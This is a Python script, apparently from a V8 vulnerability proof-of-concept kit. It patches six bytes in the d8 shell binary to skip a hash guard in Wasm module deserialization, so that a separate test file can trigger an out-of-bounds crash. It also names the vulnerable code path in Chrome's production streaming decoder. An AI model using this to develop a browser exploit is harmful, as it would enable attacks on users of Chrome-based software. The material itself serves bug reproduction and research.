#!/usr/bin/env python3
"""
patch_d8.py — Remove d8's hash guard so poc_nogdb.js triggers the OOB crash
without GDB.

Background: d8's Shell::WasmDeserializeModule contains a hash guard that
rejects mismatched (blob, wire_bytes) pairs.  Chrome's production path
(streaming-decoder.cc:435 → DeserializeNativeModule) has NO such guard.
This patch removes the d8-specific guard to match the Chrome production
behaviour, allowing poc_nogdb.js to reach the vulnerable ReadCode loop.

Usage:
  python3 patch_d8.py <path/to/d8> <path/to/d8_poc>
  ./d8_poc --no-liftoff --no-wasm-lazy-compilation poc_nogdb.js

What the patch does:
  At file offset 0x664d95 (VA 0x665d95, inside Shell::WasmDeserializeModule),
  the first conditional jump to the hash-guard failure path is replaced with
  an unconditional jump to the success path:

    Before: 0f 84 ba 00 00 00  (je  0x665e55 — hash not found → throw)
    After:  e9 4a 01 00 00 90  (jmp 0x665ee4 — proceed to DeserializeNativeModule)

  This targets V8 commit 147d9e5b (branch main), release build, x64.
  Verify that nm output for d8 shows:
    0000000000665890 t _ZN2v85Shell21WasmDeserializeModuleERKNS...
"""
import sys
import shutil

FILE_OFFSET = 0x664d95
EXPECT = bytes([0x0f, 0x84, 0xba, 0x00, 0x00, 0x00])  # je 0x665e55
PATCH  = bytes([0xe9, 0x4a, 0x01, 0x00, 0x00, 0x90])   # jmp 0x665ee4; nop

def patch(src: str, dst: str):
    shutil.copy2(src, dst)
    with open(dst, 'r+b') as f:
        f.seek(FILE_OFFSET)
        cur = f.read(6)
        if cur != EXPECT:
            print(f"[!] Unexpected bytes at 0x{FILE_OFFSET:x}: {cur.hex()}")
            print(f"    Expected: {EXPECT.hex()}")
            print("    This patch targets V8 commit 147d9e5b (branch main, release, x64).")
            sys.exit(1)
        f.seek(FILE_OFFSET)
        f.write(PATCH)
    import os; os.chmod(dst, 0o755)
    print(f"[+] Patched {src} → {dst}")
    print(f"    {EXPECT.hex()} → {PATCH.hex()} at 0x{FILE_OFFSET:x}")
    print("[+] Run: ./d8_poc --no-liftoff --no-wasm-lazy-compilation poc_nogdb.js")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <d8> <d8_poc>")
        sys.exit(1)
    patch(sys.argv[1], sys.argv[2])
